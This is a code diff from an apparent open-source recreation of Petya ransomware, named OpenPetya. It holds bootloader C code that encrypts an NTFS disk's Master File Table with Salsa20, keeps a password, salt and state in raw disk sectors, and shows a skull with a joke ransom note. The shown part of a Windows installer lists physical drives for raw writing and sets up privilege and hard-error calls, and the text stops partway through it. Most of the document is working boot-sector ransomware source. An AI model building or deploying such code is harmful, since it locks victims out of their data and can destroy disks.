+    for (int i = 0; i < SALT_SIZE; i += 4)
+    {
+        uint32_t r = prng_next();
+        sector[4 + i + 0] = (uint8_t)r;
+        sector[4 + i + 1] = (uint8_t)(r >> 8);
+        sector[4 + i + 2] = (uint8_t)(r >> 16);
+        sector[4 + i + 3] = (uint8_t)(r >> 24);
+    }
+
+    if (ata_write(SALT_SECTOR, 1, sector) != 0)
+    {
+        vga_puts("ntfs_generate_salt: write failed\n");
+        return -1;
+    }
+
+    vga_puts("Salt is generated and saved to sector ");
+    vga_put_dec(SALT_SECTOR);
+    vga_putchar('\n');
+
+    return 0;
+}
+
+int ntfs_mft_encrypt(const char *password, uint32_t partition_lba)
+{
+    uint8_t salt[SALT_SIZE];
+    if (read_salt(salt) != 0)
+        return -1;
+
+    uint8_t key[32];
+    kdf_derive(key, password, salt, KDF_ITERATIONS);
+
+    uint32_t mft_lba;
+    if (get_mft_lba(partition_lba, &mft_lba) != 0)
+    {
+        for (int i = 0; i < 32; i++)
+            key[i] = 0;
+        
+        return -1;
+    }
+
+    vga_puts("Encrypting MFT [");
+    
+    static uint8_t sector_buffer[512];
+    static uint8_t out_buffer[512];
+    for (uint32_t i = 0; i < MFT_ENCRYPT_SECTORS; i++)
+    {
+        if (ata_read(mft_lba + i, 1, sector_buffer) != 0)
+        {
+            vga_puts("\nRead error!\n");
+            for (int j = 0; j < 32; j++)
+                key[j] = 0;
+
+            return -1;
+        }
+
+        uint8_t nonce[8] = { 0 };
+        nonce[0] = (uint8_t)i;
+        nonce[1] = (uint8_t)(i >> 8);
+        nonce[2] = (uint8_t)(i >> 16);
+        nonce[3] = (uint8_t)(i >> 24);
+
+        Salsa20_Ctx ctx;
+        salsa20_init(&ctx, key, nonce, 0);
+        salsa20_encrypt(&ctx, sector_buffer, out_buffer, 512);
+
+        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
+        {
+            vga_puts("\nWrite error!\n");
+            for (int j = 0; j < 32; j++)
+                key[j] = 0;
+
+            return -1;
+        }
+
+        if (i % 16 == 0)
+            vga_putchar('#');
+    }
+
+    vga_puts("]\n");
+
+    validate_save_tag(key);
+
+    for (int i = 0; i < 32; i++)
+        key[i] = 0;
+
+    return 0;
+}
+
+int ntfs_mft_decrypt(const char *password, uint32_t partition_lba)
+{
+    uint8_t salt[SALT_SIZE];
+    if (read_salt(salt) != 0)
+        return -1;
+
+    vga_puts("Deriving key...\n");
+    uint8_t key[32];
+    kdf_derive(key, password, salt, KDF_ITERATIONS);
+
+    vga_puts("Validating key...\n");
+    if (!validate_check_key(key))
+    {
+        vga_puts("Validation failed: wrong password.\n");
+        vga_puts("MFT untouched.\n");
+
+        for (int i = 0; i < 32; i++)
+            key[i] = 0;
+
+        return -1;
+    }
+
+    vga_puts("Password is validated.\n");
+    
+    uint32_t mft_lba;
+    if (get_mft_lba(partition_lba, &mft_lba) != 0)
+    {
+        for (int i = 0; i < 32; i++)
+            key[i] = 0;
+
+        return -1;
+    }
+
+    vga_puts("Decrypting MFT [");
+
+    static uint8_t sector_buffer[512];
+    static uint8_t out_buffer[512];
+
+    for (uint32_t i = 0; i < MFT_ENCRYPT_SECTORS; i++)
+    {
+        if (ata_read(mft_lba + i, 1, sector_buffer) != 0)
+        {
+            vga_puts("\nRead error!\n");
+            for (int i = 0; i < 32; i++)
+                key[i] = 0;
+
+            return -1;
+        }
+
+        uint8_t nonce[8] = { 0 };
+        nonce[0] = (uint8_t)i;
+        nonce[1] = (uint8_t)(i >> 8);
+        nonce[2] = (uint8_t)(i >> 16);
+        nonce[3] = (uint8_t)(i >> 24);
+
+        Salsa20_Ctx ctx;
+        salsa20_init(&ctx, key, nonce, 0);
+        salsa20_decrypt(&ctx, sector_buffer, out_buffer, 512);
+
+        if (ata_write(mft_lba + i, 1, out_buffer) != 0)
+        {
+            vga_puts("\nWrite error!\n");
+            for (int i = 0; i < 32; i++)
+                key[i] = 0;
+
+            return -1;
+        }
+
+        if (i % 16 == 0)
+            vga_putchar('#');
+    }
+
+    vga_puts("]\n");
+
+    //validate_save_tag(key);
+
+    for (int i = 0; i < 32; i++)
+        key[i] = 0;
+
+    return 0;
+}
+
+static const uint8_t KNOWN_PLAIN[32] = {
+    'B','O','O','T','L','O','A','D',
+    'E','R','V','E','R','I','F','Y',
+    0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,
+    0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE
+};
+
+static void compute_tag(const uint8_t key[32], uint8_t tag[TAG_SIZE])
+{
+    uint8_t nonce[8] = {
+        0xAB, 0xCD, 0xEF, 0x12,
+        0x34, 0x56, 0x78, 0x9A,
+    };
+
+    Salsa20_Ctx ctx;
+
+    salsa20_init(&ctx, key, nonce, 0);
+
+    salsa20_encrypt(&ctx, KNOWN_PLAIN, tag, TAG_SIZE);
+}
+
+int validate_save_tag(const uint8_t key[32])
+{
+    static uint8_t sector[512] = { 0 };
+
+    sector[0] = VALIDATE_MAGIC_0;
+    sector[1] = VALIDATE_MAGIC_1;
+    sector[2] = VALIDATE_MAGIC_2;
+    sector[3] = VALIDATE_MAGIC_3;
+
+    compute_tag(key, sector + 4);
+
+    if (ata_write(VALIDATE_SECTOR, 1, sector) != 0)
+    {
+        vga_puts("validate_save_tag: write failed\n");
+        return -1;
+    }
+
+    vga_puts("Validation tag saved to sector");
+    vga_put_dec(VALIDATE_SECTOR);
+    vga_putchar('\n');
+
+    return 0;
+}
+
+int validate_check_key(const uint8_t key[32])
+{
+    static uint8_t sector[512] __attribute__((aligned(16)));
+
+    if (ata_read(VALIDATE_SECTOR, 1, sector) != 0)
+    {
+        vga_puts("validate_check_key: read failed\n");
+        return 0;
+    }
+
+    if (sector[0] != VALIDATE_MAGIC_0 || sector[1] != VALIDATE_MAGIC_1 || sector[2] != VALIDATE_MAGIC_2 || sector[3] != VALIDATE_MAGIC_3)
+    {
+        vga_puts("Validate sector not initialized!");
+        return 0;
+    }
+
+    uint8_t expected_tag[TAG_SIZE] __attribute__((aligned(16)));;
+    compute_tag(key, expected_tag);
+
+    uint8_t diff = 0;
+    for (int i = 0; i < TAG_SIZE; i++)
+        diff |= expected_tag[i] ^ sector[i + 4];
+
+    return diff == 0; // 0 = all bytes match = correct key
+}
+```
+
+`bootloader/ntfs_crypt.h`:
+
+```h
+// ntfs_crypt.h
+
+#ifndef NTFS_CRYPT_H
+#define NTFS_CRYPT_H
+
+#include "types.h"
+
+#define SALT_SECTOR 62
+#define SALT_SIZE 16
+
+#define MFT_ENCRYPT_SECTORS 256
+
+#define KDF_ITERATIONS 1000
+
+#define VALIDATE_SECTOR 61
+#define TAG_SIZE 32
+
+#define VALIDATE_MAGIC_0 0xAB
+#define VALIDATE_MAGIC_1 0xCD
+#define VALIDATE_MAGIC_2 0xEF
+#define VALIDATE_MAGIC_3 0x12
+
+/// @brief Encrypt MFT
+/// @param password Salsa20 encryption password
+/// @param partition_lba LBA of partition
+/// @return 
+int ntfs_mft_encrypt(const char *password, uint32_t partition_lba);
+
+/// @brief Decrypt MFT
+/// @param password Salsa20 decryption password
+/// @param partition_lba LBA of partition
+/// @return 
+int ntfs_mft_decrypt(const char *password, uint32_t partition_lba);
+
+/// @brief Generate salt for MFT encryption
+/// @param  
+/// @return 
+int ntfs_generate_salt(void);
+
+int validate_save_tag(const uint8_t key[32]);
+
+int validate_check_key(const uint8_t key[32]);
+
+#endif
+```
+
+`bootloader/password_store.c`:
+
+```c
+// password_store.c
+
+#include "password_store.h"
+#include "ata.h"
+#include "bootloader.h"
+
+static uint8_t sector_buffer[512];
+
+int pwstore_read(char *buffer, int max_len)
+{
+    if (ata_read(PW_SECTOR, 1, sector_buffer) != 0)
+    {
+        vga_puts("pwstore_read: ATA read failed\n");
+        return -1;
+    }
+
+    // Debug: dump first 16 bytes of sector 59
+    vga_puts("sector 59 bytes: ");
+    for (int i = 0; i < 16; i++)
+    {
+        vga_put_hex(sector_buffer[i]);
+        vga_putchar(' ');
+    }
+    vga_putchar('\n');
+
+    vga_puts("magic read: ");
+    vga_put_hex(*(uint32_t *)sector_buffer);
+    vga_putchar('\n');
+    vga_puts("magic expected: ");
+    vga_put_hex(PW_MAGIC);
+    vga_putchar('\n');
+
+    stPasswordStore *ps = (stPasswordStore *)sector_buffer;
+    if (ps->magic != PW_MAGIC)
+    {
+        vga_puts("pwstore_read: no password found in sector 59\n");
+        return -1;
+    }
+
+    if (ps->len == 0 || ps->len > PW_MAX_LEN)
+    {
+        vga_puts("pwstore_read: invalid password length\n");
+        return -1;
+    }
+
+    int copy_len = ps->len < max_len - 1 ? ps->len : max_len - 1;
+    for (int i = 0; i < copy_len; i++)
+        buffer[i] = ps->password[i];
+
+    buffer[copy_len] = '\0';
+
+    return 0;
+}
+
+int pwstore_erase(void)
+{
+    for (int pass = 0; pass < 3; pass++)
+    {
+        for (int i = 0; i < 512; i++)
+            sector_buffer[i] = (pass == 1 ? 0xFF : 0x00);
+
+        vga_puts("pwstore_erase: pass ");
+        vga_put_dec(pass);
+        vga_puts("...\n");
+
+        if (ata_write(PW_SECTOR, 1, sector_buffer) != 0)
+        {
+            vga_puts("pwstore_erase: write FAILED on pass ");
+            vga_put_dec(pass);
+            vga_putchar('\n');
+            return -1;
+        }
+
+        vga_puts("pwstore_erase: pass ");
+        vga_put_dec(pass);
+        vga_puts(" OK\n");
+    }
+
+    vga_puts("\tPassword sector erased (3 passes).\n");
+    return 0;
+}
+```
+
+`bootloader/password_store.h`:
+
+```h
+// password_store.h
+
+#ifndef PASSWORD_STORE_H
+#define PASSWORD_STORE_H
+
+#include "types.h"
+
+#define PW_SECTOR 59
+#define PW_MAX_LEN 64
+
+#define PW_MAGIC 0x50415353UL // "PASS"
+
+typedef struct
+{
+    uint32_t magic;
+    uint8_t len;
+    char password[PW_MAX_LEN];
+    uint8_t padding[443];
+} __attribute__ ((packed)) stPasswordStore;
+
+/// @brief 
+/// @param buffer 
+/// @param max_len 
+/// @return 
+int pwstore_read(char *buffer, int max_len);
+
+/// @brief 
+/// @param  
+/// @return 
+int pwstore_erase(void);
+
+#endif
+```
+
+`bootloader/petya.c`:
+
+```c
+// petya.c
+
+#include "petya.h"
+#include "types.h"
+#include "ata.h"
+#include "salsa20.h"
+#include "bootloader.h"
+
+void print_petya_art(void)
+{
+    vga_clear();
+    vga_draw_centered_ascii(PETYA_ART);    
+    //vga_puts(RANSOM_MSG);
+    vga_putchar('\n');
+}
+```
+
+`bootloader/petya.h`:
+
+```h
+// petya.h
+
+#ifndef PETYA_H
+#define PETYA_H
+
+#include "types.h"
+#include "hidden_store.h"
+
+#define PETYA_ART \
+" ::::-=:::::::.   .:.:::-=:::::::-=-..     .   .::::-==**+ \n" \
+" :::::==:::::::==:. ..=*#+-:::---=*#-::::. -:.*%=*:::==::: \n" \
+" ::::::#%@=.=#+==**------===========---=*:@%%%@#-::=:.=*:: \n" \
+" :::**:::*%%%%%=:-==-----------------------@@@@@@%*:-@=:=* \n" \
+" =*-:::%%%%@%=-=-----------------------:::=-=@@@@@@@@@=::: \n" \
+" :=@%%#%%%%%:--------------------:-:::::::::-#=@@@@@@%*::: \n" \
+" ::#@@@@%@*=-:::::--:-:-:-:-:-::::-=:-::::::---*@@@@%%%*:: \n" \
+" :=@%%%%%*-:::::::::::::::::::::-:::----:--------@@@%*-::: \n" \
+" :#%%%%%+----::::-:::::::::::::--------=----------*:    =: \n" \
+" ::   :----------------=---------=-------=-----------   =: \n" \
+" :-. :--:-----=------------------=--------=----------+   . \n" \
+" ==.:=:------=---------=---------==--------==--------:=  : \n" \
+"   .+:------==---------=----------*---------==--------=-:= \n" \
+" =.=:------==---------=+----------==---------==--------*-= \n" \
+" --+-------+=---=----==+----------=+=---------+=-------=== \n" \
+" -=+-------+=--+-----=.:=---=------.-==-===---=+=------=== \n" \
+" -==------=+=-=----=-.=@%=-==---%@*.  ===--+=--*=------+== \n" \
+" --*==---==+===---*:.  ..=-==-----.     =+====-++=---==+== \n" \
+" --++==---=++==-=:    .: :-+==-=--.:.%@@@@@%*%==+=-====+== \n" \
+" --=*===-==++%+@@@@@@@@: .=-=-=--=.@@@%+ @ *@@@*+======+-- \n" \
+" --=+=====-+@@@@ *%%=*.-* . -===-..:@%.-%%  @@::+=====+=-- \n" \
+" ---#=======+:@: =%=..*+    -===.. :@*:+#@  - .:=====++--- \n" \
+" ---*=+=====+..:  +#++*=    .==.    =#+*#.%.  .:====+++--- \n" \
+" ---+:=+=====:   @ ::: .     =        .:::::: -====+===--- \n" \
+" ---*::-+*====. :::::.                .:::::..:==*=::+=--- \n" \
+" --:*::::=+*==+.......   ::      ::         .%=--=--:+==-- \n" \
+" -=-*::::::-=@@%: .        ::::::         :%%%@@:::-=*==-- \n" \
+" -==*=:::=@%%%%%%%+:.                 .: .*%%%%%%@=:-*==-- \n" \
+" -=+-:#@%%%%%%%%#   %@@*:.       .:.#@@@@:  +%%%%%%@=+==-- \n" \
+" ==+:@%%%%%%%%%*    :%@@@%   ....  :@@@@@%:   %%%%%%%@*=-- \n" \
+"                                                           \n" \
+"              (Press any key to NiHaHaHaHa)                \n"
+
+#define RANSOM_MSG \
+"Ooops, your important files are encrypted.\n" \
+"\n" \
+"If you see this text, then your files are no longer accessible,\n" \
+"because they have been encrypted. Perhaps you are busy looking for a way to\n" \
+"recover your files, but don't waste your time.\n" \
+"Nobody can recover your file without our decryption service.\n" \
+"\n" \
+"We guaratee that you can recover all your files safely and easily.\n" \
+"All you need to do is the following:\n\n" \
+"1. Play Blue Archive.\n\n" \
+"2. Say this sentence out loud:\n\t\"NiHaHaHaHa!\"\n\n" 
+
+void print_petya_art(void);
+
+#endif
+```
+
+`bootloader/salsa20.c`:
+
+```c
+// salsa20.c
+/*
+References / Learning Resources:
+    - https://github.com/Daeinar/salsa20/blob/master/salsa.py
+    - https://cr.yp.to/snuffle/salsafamily-20071225.pdf
+    - https://asecuritysite.com/symmetric/salsa20
+    - Serious Cryptography (2nd Edition), Jean-Philippe Aumasson
+*/
+
+#include "salsa20.h"
+
+static inline uint32_t rotl32(uint32_t v, int n)
+{
+    return (v << n) | (v >> (32 - n));
+}
+
+static inline void qr(uint32_t *a, uint32_t *b, uint32_t *c, uint32_t *d)
+{
+    *b ^= rotl32(*a + *d, 7);
+    *c ^= rotl32(*b + *a, 9);
+    *d ^= rotl32(*c + *b, 13);
+    *a ^= rotl32(*d + *c, 18);
+}
+
+/// @brief 
+/// @param out 
+/// @param in 
+static void salsa20_block(uint32_t out[16], const uint32_t in[16])
+{
+    uint32_t s[16];
+    for (int i = 0; i < 16; i++)
+        s[i] = in[i];
+
+    // 20 rounds (10 double rounds)
+    for (int i = 0; i < 10; i++)
+    {
+        // column rounds
+        qr(&s[0],  &s[4],  &s[8],  &s[12]);
+        qr(&s[5],  &s[9],  &s[13], &s[1]);
+        qr(&s[10], &s[14], &s[2],  &s[6]);
+        qr(&s[15], &s[3],  &s[7],  &s[11]);
+
+        // row rounds
+        qr(&s[0],  &s[1],  &s[2],  &s[3]);
+        qr(&s[5],  &s[6],  &s[7],  &s[4]);
+        qr(&s[10], &s[11], &s[8],  &s[9]);
+        qr(&s[15], &s[12], &s[13], &s[14]);
+    }
+
+    for (int i = 0; i < 16; i++)
+        out[i] = s[i] + in[i];
+}
+
+/// @brief 
+/// @param p 
+/// @return 
+static uint32_t load32_le(const uint8_t *p)
+{
+    return (uint32_t)p[0] | (uint32_t)p[1] << 8 | (uint32_t)p[2] << 16 | (uint32_t)p[3] << 24;
+}
+
+void salsa20_init(Salsa20_Ctx *ctx, const uint8_t key[32], const uint8_t nonce[8], uint64_t counter)
+{
+    // expand 32-byte k
+    ctx->state[0] = 0x61707865;
+    ctx->state[5] = 0x3320646e;
+    ctx->state[10] = 0x79622d32;
+    ctx->state[15] = 0x6b206574;
+
+    // key (32 bytes)
+    ctx->state[1] = load32_le(key +  0);
+    ctx->state[2] = load32_le(key +  4);
+    ctx->state[3] = load32_le(key +  8);
+    ctx->state[4] = load32_le(key + 12);
+    ctx->state[11] = load32_le(key + 16);
+    ctx->state[12] = load32_le(key + 20);
+    ctx->state[13] = load32_le(key + 24);
+    ctx->state[14] = load32_le(key + 28);
+
+    // counter (64-bit)
+    ctx->state[8] = (uint32_t)(counter);
+    ctx->state[9] = (uint32_t)(counter >> 32);
+
+    // nonce (8 bytes)
+    ctx->state[6] = load32_le(nonce + 0);
+    ctx->state[7] = load32_le(nonce + 4);
+}
+
+void salsa20_encrypt(Salsa20_Ctx *ctx, const uint8_t *in, uint8_t *out, uint32_t len)
+{
+    uint32_t block[16];
+    uint8_t keystream[64];
+
+    while (len > 0)
+    {
+        salsa20_block(block, ctx->state);
+        
+        // convert block to bytes (little-endian)
+        for (int i = 0; i < 16; i++)
+        {
+            keystream[i*4] = (uint8_t)block[i];
+            keystream[i*4 + 1] = (uint8_t)(block[i] >> 8);
+            keystream[i*4 + 2] = (uint8_t)(block[i] >> 16);
+            keystream[i*4 + 3] = (uint8_t)(block[i] >> 24);
+        }
+
+        uint32_t n = len < 64 ? len : 64;
+        for (uint32_t i = 0; i < n; i++)
+            out[i] = in[i] ^ keystream[i];
+
+        // increment counter
+        ctx->state[8]++;
+        if (ctx->state[8] == 0)
+            ctx->state[9]++;
+        
+        in += n;
+        out += n;
+        len -= n;
+    }
+}
+```
+
+`bootloader/salsa20.h`:
+
+```h
+// salsa20.h
+
+#ifndef SALSA20_H
+#define SALSA20_H
+
+#include "types.h"
+
+typedef struct {
+    uint32_t state[16];
+} Salsa20_Ctx;
+
+/// @brief 
+/// @param ctx 
+/// @param key 
+/// @param nonce 
+/// @param counter 
+void salsa20_init(Salsa20_Ctx *ctx, const uint8_t key[32], const uint8_t nonce[8], uint64_t counter);
+
+/// @brief 
+/// @param ctx 
+/// @param in 
+/// @param out 
+/// @param len 
+void salsa20_encrypt(Salsa20_Ctx *ctx, const uint8_t *in, uint8_t *out, uint32_t len);
+
+// encrypt = decrypt (strema cipher XOR)
+#define salsa20_decrypt salsa20_encrypt
+
+#endif
+```
+
+`bootloader/state.c`:
+
+```c
+// state.c
+
+#include "state.h"
+#include "ata.h"
+#include "bootloader.h"
+
+static uint8_t buffer[512];
+
+uint8_t state_read(void)
+{
+    if (ata_read(STATE_SECTOR, 1, buffer) != 0)
+        return STATE_NOT_SETUP;
+
+    stBootState *state = (stBootState *)buffer;
+    if (state->magic != STATE_MAGIC)
+        return STATE_NOT_SETUP;
+
+    return state->state;
+}
+
+int state_write(uint8_t new_state)
+{
+    static uint8_t buf[512];
+
+    // Read current sector to preserve disk_total_sectors
+    if (ata_read(STATE_SECTOR, 1, buf) != 0)
+    {
+        vga_puts("state_write: read failed\n");
+        return -1;
+    }
+
+    stBootState *state = (stBootState *)buf;
+
+    vga_puts("state_write: before write, disk_sectors=");
+    vga_put_dec((uint32_t)state->disk_total_sectors);
+    vga_putchar('\n');
+
+    state->magic = STATE_MAGIC;
+    state->state = new_state;
+
+    if (ata_write(STATE_SECTOR, 1, buf) != 0)
+    {
+        vga_puts("state_write: write failed\n");
+        return -1;
+    }
+
+    // Verify the write actually stuck
+    static uint8_t verify[512];
+    if (ata_read(STATE_SECTOR, 1, verify) != 0)
+    {
+        vga_puts("state_write: verify read failed\n");
+        return -1;
+    }
+
+    stBootState *v = (stBootState *)verify;
+    vga_puts("state_write verify: magic=");
+    vga_put_hex(v->magic);
+    vga_puts(" state=");
+    vga_put_hex(v->state);
+    vga_putchar('\n');
+
+    if (v->magic != STATE_MAGIC || v->state != new_state)
+    {
+        vga_puts("state_write: verify MISMATCH!\n");
+        return -1;
+    }
+
+    return 0;
+}
+
+uint64_t state_read_disk_size(void)
+{
+    if (ata_read(STATE_SECTOR, 1, buffer) != 0)
+    {
+        vga_puts("ATA read FAILED\n");
+        return 0;
+    }
+
+    vga_puts("ata_read OK, magic=");
+
+    stBootState *state = (stBootState *)buffer;
+    vga_put_hex(state->magic);
+    vga_puts(" disk_sectors=");
+    vga_put_dec((uint32_t)state->disk_total_sectors);
+    vga_putchar('\n');
+
+    if (state->magic != STATE_MAGIC)
+        return 0;
+
+    return state->disk_total_sectors;
+}
+```
+
+`bootloader/state.h`:
+
+```h
+// state.h
+
+#ifndef STATE_H
+#define STATE_H
+
+#include "types.h"
+
+#define STATE_SECTOR 60
+#define STATE_MAGIC 0x424F4F54UL
+
+#define STATE_NOT_SETUP 0x00
+#define STATE_ENCRYPTED 0x01
+
+typedef struct {
+    uint32_t magic;
+    uint8_t state;
+    uint8_t reserved[3];
+    uint64_t disk_total_sectors; // set by installer, used by hidden_store
+    uint8_t padding[496];
+} __attribute__ ((packed)) stBootState;
+
+/// @brief Read state from disk
+/// @param  
+/// @return 
+uint8_t state_read(void);
+
+/// @brief Write state into disk
+/// @param new_state 
+/// @return 
+int state_write(uint8_t new_state);
+
+/// @brief Read disk size
+/// @param  
+/// @return 
+uint64_t state_read_disk_size(void);
+
+#endif
+```
+
+`bootloader/types.h`:
+
+```h
+// types.h
+
+#ifndef TYPE_H
+#define TYPE_H
+
+typedef unsigned char uint8_t;
+typedef unsigned short uint16_t;
+typedef unsigned int uint32_t;
+typedef unsigned long long uint64_t;
+
+typedef signed char int8_t;
+typedef uint32_t  uintptr_t;
+typedef uint32_t  size_t;
+
+#endif
+```
+
+`bootloader/utils.c`:
+
+```c
+// utils.c
+
+#include "utils.h"
+#include "types.h"
+#include "io.h"
+
+// string comparison
+int strcmp(const char *string1, const char *string2)
+{
+    while (*string1 && (*string1 == *string2))
+    {
+        string1++;
+        string2++;
+    }
+
+    return (unsigned char)*string1 - (unsigned char)*string2;
+}
+
+// sleep for specified miliseconds
+void sleep(uint32_t ms)
+{
+    // 1193182 Hz / 1000 = 1193 ticks per millisecond
+    uint16_t ticks_per_ms = 1193;
+
+    for (uint32_t i = 0; i < ms; i++)
+    {
+        // Set PIT to Mode 0 (Interrupt on Terminal Count)
+        // Binary, Mode 0, LSB then MSB, Channel 0
+        outb(0x43, 0x30); 
+
+        // Send the frequency divider
+        outb(0x40, (uint8_t)(ticks_per_ms & 0xFF));        // Low byte
+        outb(0x40, (uint8_t)((ticks_per_ms >> 8) & 0xFF)); // High byte
+
+        // Poll the PIT until it reaches zero
+        // In Mode 0, the output pin goes high when counting is done
+        uint8_t status = 0;
+        while (!(status & 0x80))
+        {
+            // Command 0xE2: Read-back command for channel 0
+            outb(0x43, 0xE2);
+            status = inb(0x40);
+        }
+    }
+}
+
+void zero_buffer(char *buffer, int len)
+{
+    for (int i = 0; i < len; i++)
+        buffer[i] = 0;
+}
+```
+
+`bootloader/utils.h`:
+
+```h
+// utils.h
+
+#ifndef UTILS_H
+#define UTILS_H
+
+#include "types.h"
+
+int strcmp(const char *string1, const char *string2);
+void sleep(uint32_t ms);
+void zero_buffer(char *buffer, int len);
+
+#endif
+```
+
+`build.sh`:
+
+```sh
+echo "[*] Compiling..."
+rm ./main/OpenPetya.exe
+x86_64-w64-mingw32-g++ -o ./main/OpenPetya.exe ./main/OpenPetya.cpp -lsetupapi -static
+echo "[+] OK"
+
+```
+
+`main/OpenPetya.cpp`:
+
+```cpp
+// OpenPetya.cpp
+// Author: iss4cf0ng/ISSAC
+// GitHub: https://github.com/iss4cf0ng/OpenPetya/
+
+#include <windows.h>
+#include <winternl.h>
+#include <iostream>
+#include <setupapi.h>
+#include <devguid.h>
+#include <fstream>
+#include <vector>
+#include <sstream>
+#include <iomanip>
+#include <cstring>
+#include <tchar.h>
+
+#pragma comment(lib, "setupapi.lib")
+
+#define SECTOR_SIZE 512
+#define MBR_BOOT_CODE_SIZE 446
+#define MBR_FULL_SIZE 512
+#define STAGE2_START_SECTOR 1
+#define BACKUP_MBR_SECTOR 63
+
+typedef NTSTATUS (NTAPI* NtRaiseHardError_t)(
+    NTSTATUS,
+    ULONG,
+    ULONG,
+    PULONG_PTR,
+    ULONG,
+    PULONG
+);
+
+typedef NTSTATUS (NTAPI *RtlAdjustPrivilege_t)(
+    ULONG,
+    BOOLEAN,
+    BOOLEAN,
+    PBOOLEAN
+);
+
+struct stDriveInfo
+{
+    int nIndex;
+    UINT64 uSizeBytes;
+    std::wstring szModel;
+    std::wstring szPath;
+};
+
+/// @brief 
+/// @param abBuffer 
+/// @param nLength 
+/// @param nOffset 
+/// @return 
+ULONG fnHexdump(const uint8_t* abBuffer, size_t nLength, size_t nOffset = 0)
+{
+    ULONG nResult = 0;
+    for (ULONG i = 0; i < nLength; i += 16)
+    {
+        printf("%08X |", i);
+
+        nResult += 16;
+        for (ULONG j = 0; j < 16; j++)
+        {
+            if (i + j < nLength)
+            {
+                nResult += printf(" %02X", abBuffer[i + j]);
+            }
+            else
+            {
+                nResult += printf(" 00");
+            }
+        }
+
+        nResult += printf(" | ");
+        for (ULONG j = 0; j < 16; j++)
+        {
+            if (i + j < nLength)
+            {
+                UCHAR k = abBuffer[i + j];
+                UCHAR c = k < 32 || k > 127 ? '.' : k;
+                nResult += printf("%c", c);
+            }
+            else
+            {
+                nResult += printf(" ");
+            }
+        }
+
+        nResult += printf("\n");
+    }
+
+    return nResult;
+}
+
+/// @brief Disk handling class
+class clsDiskHandle
+{
+public:
+    HANDLE m_hFile = INVALID_HANDLE_VALUE;
+
+    clsDiskHandle() = default;
+
+    ~clsDiskHandle()
+    {
+        if (INVALID_HANDLE_VALUE != m_hFile)
+            CloseHandle(m_hFile);
+    }
+
+    bool fnbOpen(const std::wstring& szPath, bool bWriteAccess)
+    {
+        DWORD dwAccess = bWriteAccess ? GENERIC_READ | GENERIC_WRITE : GENERIC_READ;
+        m_hFile = CreateFileW(
+            szPath.c_str(),
+            dwAccess,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            nullptr,
+            OPEN_EXISTING,
+            FILE_FLAG_WRITE_THROUGH,
+            nullptr
+        );
+
+        if (INVALID_HANDLE_VALUE == m_hFile)
+        {
+            DWORD hError = GetLastError();
+            std::wcerr << L"Failed to open " << szPath << L" (error " << hError << L")\n";
+
+            if (ERROR_ACCESS_DENIED == hError)
+                std::cerr << " Please Run as Administrator\n";
+
+            return false;
+        }
+
+        return true;
+    }
+
+    bool fnbReadSectors(LONGLONG nLBA, DWORD nCount, std::vector<uint8_t>& abBuffer)
+    {
+        LARGE_INTEGER nOffset;
+        nOffset.QuadPart = nLBA * SECTOR_SIZE;
+
+        if (!SetFilePointerEx(m_hFile, nOffset, nullptr, FILE_BEGIN))
+        {
+            std::cerr << "Seek failed (error: " << GetLastError() << ")\n";
+            return false;
+        }
+
+        abBuffer.resize((size_t)(nCount * SECTOR_SIZE));
+        DWORD nRead = 0;
+        if (!ReadFile(m_hFile, abBuffer.data(), (DWORD)abBuffer.size(), &nRead, nullptr) || nRead != abBuffer.size())
+        {
+            std::wcerr << "Read failed (error: " << GetLastError() << ")\n";
+            return false;
+        }
+
+        return true;
+    }
+
+    bool fnbWriteSectors(LONGLONG nLBA, const std::vector<uint8_t>& abBuffer)
+    {
+        LARGE_INTEGER nOffset;
+        nOffset.QuadPart = nLBA * SECTOR_SIZE;
+
+        if (!SetFilePointerEx(m_hFile, nOffset, nullptr, FILE_BEGIN))
+        {
+            std::wcerr << "Seek failed (error " << GetLastError() << ")\n";
+            return false;
+        }
+
+        DWORD written = 0;
+        if (!WriteFile(m_hFile, abBuffer.data(), (DWORD)abBuffer.size(), &written, nullptr) || written != abBuffer.size())
+        {
+            std::wcerr << "Write failed (error " << GetLastError() << ")\n";
+            return false;
+        }
+
+        FlushFileBuffers(m_hFile);
+        return true;
+    }
+};
+
+/// @brief 
+/// @return 
+std::vector<stDriveInfo> fnListDrives()
+{
+    std::vector<stDriveInfo> lsDrives;
+
+    for (int i = 0; i < 16; i++)
+    {
+        std::wstring szPath = L"\\\\.\\PhysicalDrive" + std::to_wstring(i);
+        HANDLE hFile = CreateFileW(
+            szPath.c_str(),
+            0, // query only, no read/write
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            nullptr,
+            OPEN_EXISTING,
+            0,
+            nullptr
+        );
+
+        if (INVALID_HANDLE_VALUE == hFile)
+            continue;
+
+        stDriveInfo info;
+        info.nIndex = i;
+        info.szPath = szPath;
+
+        // Get disk size
+        DISK_GEOMETRY_EX geo = {};
+        DWORD ret = 0;
+        if (DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, nullptr, 0, &geo, sizeof(geo), &ret, nullptr))
+        {
+            info.uSizeBytes = (UINT64)geo.DiskSize.QuadPart;
+        }
+
+        STORAGE_PROPERTY_QUERY query = {};
+        query.PropertyId = StorageDeviceProperty;
+        query.QueryType = PropertyStandardQuery;
+
+        uint8_t abDescriptor[512] = {};
+        if (DeviceIoControl(hFile, IOCTL_STORAGE_QUERY_PROPERTY, &query, sizeof(query), abDescriptor, sizeof(abDescriptor), &ret, nullptr))
+        {
+            auto *descriptor = reinterpret_cast<STORAGE_DEVICE_DESCRIPTOR*>(abDescriptor);
+            if (descriptor->ProductIdOffset)
+            {
+                const char *szModel = reinterpret_cast<const char*>(abDescriptor) + descriptor->ProductIdOffset;
+                int nLength = MultiByteToWideChar(CP_ACP, 0, szModel, -1, nullptr, 0);
+                if (nLength > 0)
+                {
+                    std::wstring s(nLength, 0);
+                    MultiByteToWideChar(CP_ACP, 0, szModel, -1, &s[0], nLength);
+                    while (!s.empty() && (s.back() == L' ' || s.back() == L'\0'))
+                        s.pop_back();
+
+                    info.szModel = s;
+                }
+            }
+        }
+
+        if (info.szModel.empty())
+            info.szModel = L"(Unknown model)";
+
+        lsDrives.push_back(info);
+
+        CloseHandle(hFile);
+    }
+
+    return lsDrives;
+}
+
+/// @brief 
+/// @param lsDrives 
+void fnPrintDrives(const std::vector<stDriveInfo>& lsDrives)
+{
